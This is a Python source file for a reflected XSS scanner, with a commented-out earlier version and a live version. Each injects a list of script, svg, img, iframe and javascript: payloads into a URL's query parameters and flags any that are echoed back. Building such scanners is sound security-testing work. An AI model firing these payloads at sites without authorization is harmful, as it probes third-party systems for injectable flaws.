# \
# import requests, re, html
# from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

# PAYLOADS = [
#     "<script>alert(1)</script>",
#     "\"><svg/onload=alert(1)>",
#     "'><img src=x onerror=alert(1)>"
# ]

# def inject_params(url: str, payload: str) -> str:
#     parsed = urlparse(url)
#     query = parse_qs(parsed.query)
#     if not query:
#         query = {"q": [payload]}
#     else:
#         for k in list(query.keys()):
#             query[k] = [payload]
#     new_query = urlencode(query, doseq=True)
#     return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, new_query, parsed.fragment))

# def scan_xss_reflection(url: str, timeout: int = 10) -> dict:
#     results = {"possible": False, "reflections": [], "tested_payloads": []}
#     session = requests.Session()
#     session.headers.update({"User-Agent": "EduScanner/1.0"})
#     for payload in PAYLOADS:
#         test_url = inject_params(url, payload)
#         try:
#             r = session.get(test_url, timeout=timeout, allow_redirects=True)
#             body = r.text[:100000]
#             if payload in body:
#                 results["possible"] = True
#                 results["reflections"].append(f"Payload reflected directly with URL {test_url}")
#         except Exception:
#             pass
#         results["tested_payloads"].append(payload)
#     return results



import requests, re
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

ADVANCED_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", 
    "<svg onload=alert(1)>", "<a href='javascript:alert(1)'>click me</a>", 
    "<iframe src='javascript:alert(1)'></iframe>", "<div style='width: expression(alert(1))'>"
]

def inject_params(url: str, payload: str) -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    if not query:
        query = {"q": [payload]}
    else:
        for k in list(query.keys()):
            query[k] = [payload]
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, new_query, parsed.fragment))

def scan_xss_reflection(url: str, timeout: int = 10) -> dict:
    results = {"possible": False, "reflections": [], "tested_payloads": []}
    session = requests.Session()
    session.headers.update({"User-Agent": "AdvancedScanner/1.0"})
    
    for payload in ADVANCED_XSS_PAYLOADS:
        test_url = inject_params(url, payload)
        try:
            r = session.get(test_url, timeout=timeout, allow_redirects=True)
            body = r.text[:100000]
            if payload in body:
                results["possible"] = True
                results["reflections"].append(f"Payload reflected directly with URL {test_url}")
        except Exception:
            pass
        results["tested_payloads"].append(payload)
    
    return results
